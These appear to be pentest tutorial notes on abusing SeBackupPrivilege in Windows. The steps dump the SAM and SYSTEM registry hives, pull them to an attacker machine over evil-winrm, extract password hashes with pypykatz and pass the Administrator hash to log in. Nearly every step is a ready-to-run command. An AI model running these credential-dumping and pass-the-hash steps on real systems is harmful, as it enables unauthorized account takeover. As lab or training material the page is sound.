# whoami /priv

```powershell
> whoami /priv
```



## SeBackupPrivilege

<figure><img src="../../../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

This privilege allows the user to read all the files in the system.

Let's create a Temp directory and move into it.

```powershell
mkdir C:\Temp
cd C:\Temp
```

Exploit this privilege to read SAM and SYSTEM file via query.

> The **`SAM` (Security Account Manager)** hive contains local user account and group membership information, including their hashed passwords.&#x20;
>
> The **`SYSTEM`** hive contains system-wide configuration settings, such as the system boot key required to decrypt the password hashes stored in SAM

We will use the reg save command to perform a command in the registry, specify the location of the hive, and save it to a file in the current directory with the appropriate name.

```powershell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Now download the files to attacker machine

{% code title="evil-winrm shell" %}
```powershell
> download sam
> download system
```
{% endcode %}

In kali these files is unreadable, but we can extract the hive secrets from SAM and SYSTEM file using pypykatz.

> **pypykatz**
>
> Mimikatz implementation in pure Python.&#x20;
>
> [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

```bash
pypykatz registry --sam sam system -o registry.dump
# registry: Get secrets from registry files
# --sam SAM: path to the SAM registry hive
```

Now in the file `registry.dump` we have this:

<figure><img src="../../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

With hash of these account we can try to perform a PtH like this:

```bash
evil-winrm -i <IP> -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```



